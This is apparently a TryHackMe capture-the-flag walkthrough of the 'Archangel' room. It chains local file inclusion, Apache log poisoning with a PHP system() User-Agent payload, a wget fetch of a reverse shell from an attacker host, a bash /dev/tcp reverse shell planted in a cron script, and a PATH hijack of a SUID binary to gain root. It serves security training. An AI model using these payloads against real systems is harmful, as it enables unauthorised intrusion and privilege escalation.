# thm: ARcHanG3l

https://tryhackme.com/room/archangel

## Enumeration

The first step is to perform basic enumeration using Nmap. 
```
$ nmap <target>
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-18 21:21 KST
Nmap scan report for mafialive.thm
Host is up (0.33s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
Add the target ip address to `/etc/hosts` to map it to `mafialive.thm` for local access.

After visiting mafialive.thm, found first flag.
```
UNDER DEVELOPMENT
thm{[REDACTED]} 
```
Found test.php while looking at robots.txt.
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
```

### Local File Inclusion

It’s a type of web vulnerability that happens when a web application lets a user control which files are loaded or included on the server. If the input isn’t properly sanitized, an attacker can trick the application into loading sensitive files from the server.
```
http://mafialive.thm/test.php?view=/etc/passwd
```

At this stage, it is important to note that the webpage implements input validation or filtering. One way to bypass these protections is by encoding the input in Base64.

### Using php://filter in LFI Bypasses

`php://filter` is a PHP wrapper that applies filters to a file stream as it is read, without modifying the file itself.

For example, using
```
php://filter/read=convert.base64-encode/resource=/etc/passwd
```
applies Base64 encoding to the file content while it is being read.

This approach bypasses restrictions on direct file inclusion because PHP reads the file through the filter instead of directly accessing it. Filters can include Base64 encoding, string transformations, and more.

`php://filter` is commonly used in Local File Inclusion (LFI) bypasses, particularly when functions like include or require are filtered or restricted.

Request:
```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
Responce:
```
CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== 
```

The content is Base64-encoded. After decoding, the second flag is found:

```
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

            //FLAG: thm{[REDACTED]}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
                if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                    include $_GET['view'];
                }else{

                    echo 'Sorry, Thats not allowed';
                }
            }
        ?>
    </div>
</body>

</html>
```

By analyzing the code, it can be determined that the view query cannot include `../..` and the path must reside within `/var/www/html/development_testing`.

In order to get around this, therer are few ways, like `.././.././../` or `..//..//..//`

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..///etc/passwd
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```

Found two users: root and archangel.

### Log Poisoning

With LFI confirmed and Path Traversal possible, the next step was to target the Apache access logs. So like include this file and run it as PHP. By doing so, it became possible to inject a malicious payload that the system would later execute. Using a crafted URL, the contents of the `access.log` file were successfully read:

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..///var/log/apache2/access.log        
```

```
[19/Sep/2025:06:20:01 +0530] "GET /test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log HTTP/1.1" 200 628 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0" 

[19/Sep/2025:06:27:36 +0530] "GET /test.php?view=/var/www/html/development_testing/.././.././.././.././../etc/passwd HTTP/1.1" 200 949 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0" 
```

Issue here is the the server logs the `User-Agent` and then includes that log via LFI, which is why modifying it became a serious issue.

It was noticed that the `User-Agent` header can be changed to anything before sending a request. Since `test.php` can execute the contents of files, the User-Agent can be turned into valid PHP code and run on the server.

A malicious User-Agent header is when an attacker puts unexpected or harmful content into this field to exploit server vulnerabilities.

Examples of malicious content:

    User-Agent: <?php system($_GET['cmd']); ?>

Burp Suite was set up as a proxy to intercept a request, letting the User-Agent be modified to the payload and send.
```
GET /test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log HTTP/1.1
Host: mafialive.thm
User-Agent: <?php system($_GET['cmd']); ?> Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log&cmd=id
```

Now the server reads the log file, and PHP sees the code inside the log and executes it.

```
[19/Sep/2025:06:36:15 +0530] "GET /test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log&cmd=id HTTP/1.1" 200 745 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0"

[19/Sep/2025:06:36:28 +0530] "GET /test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log HTTP/1.1" 200 734 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data) Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0" 
```

Now the server reads the log file, and PHP sees the code inside the log and executes it.

### Remote Code Execution 

**Step 1**: A simple Python HTTP server is started to host the `php-reverse-shell.php`:

    $ python3 -m http.server 8888

**Step 2**: The LFI is then used to include the Apache access log and download the PHP reverse shell from the server:

    http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../var/log/apache2/access.log&cmd=wget%20http://<attacker ip>:8888/php-reverse-shell.php

**Step 3**: After the reverse shell is uploaded to the target, a Netcat listener is started:

    $ nc -lnvp 4444

**Step 4**: Accessing the PHP reverse shell at:

    https://mafialive.thm/php-reverse-shell.php

it triggers a connection back to the listener, providing an interactive shell on the target.

```
$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 
```

```
$ id    
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /home
$ ls
archangel
$ cd archangel
$ ls
myfiles  secret  user.txt
$ cat user.txt
thm{[REDACTED]}
```
```
$ cd myfiles
$ ls
passwordbackup
$ cat passwordbackup
https://www.youtube.com/watch?v=dQw4w9WgXcQ
```

This guy is just trolling lol.

## Privilege Escalation

```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

An interesting cron job was identified, running `/opt/helloworld.sh` as the user archangel. It may be possible to modify this script to achieve horizontal privilege escalation to the archangel user.

```
$ cd /opt
$ ls -la
total 16
drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
```



The permissions on helloworld.sh allow any user to modify it. This could be leveraged to set up a Bash reverse shell for privilege escalation.

```
$ echo "bash -i >& /dev/tcp/<attacker ip>/5555 0>&1" >> helloworld.sh
```

After modifying helloworld.sh, a Netcat listener is started. Within a few seconds, a shell for the archangel user is obtained.
```
$ nc -lnvp 5555
```

```
archangel@ubuntu:~$ ls
myfiles
secret
user.txt
archangel@ubuntu:~$ cd secret
archangel@ubuntu:~/secret$ ls
backup
user2.txt
archangel@ubuntu:~/secret$ cat user2.txt
thm{[REDACTED]}
```

### Root Shell

```
archangel@ubuntu:~/secret$ ls -la
total 36
drwxrwx--- 2 archangel archangel  4096 Sep 19 07:00 .
drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt
archangel@ubuntu:~/secret$ strings backup
strings backup
/lib64/ld-linux-x86-64.so.2
setuid
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
cp /home/user/archangel/myfiles/* /opt/backupfiles
:*3$"
GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
backup.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

Analysis of the backup file with the strings command revealed that it executes:

    cp /home/user/archangel/myfiles/* /opt/backupfiles

However, the cp command path is not explicitly specified. This can be exploited by placing a fake cp binary in /tmp, which will be executed by the script, potentially leading to a root shell.

```
archangel@ubuntu:~/secret$ cd /tmp
archangel@ubuntu:/tmp$ echo "/bin/bash" >> cp
archangel@ubuntu:/tmp$ cd ~/secret
archangel@ubuntu:~/secret$ chmod +x /tmp/cp
archangel@ubuntu:~/secret$ export PATH=/tmp:$PATH
archangel@ubuntu:~/secret$ ./backup
./backup
$ whoami
root
$ cd /root
ls
root.txt
$ cat root.txt
thm{[REDACTED]}
```
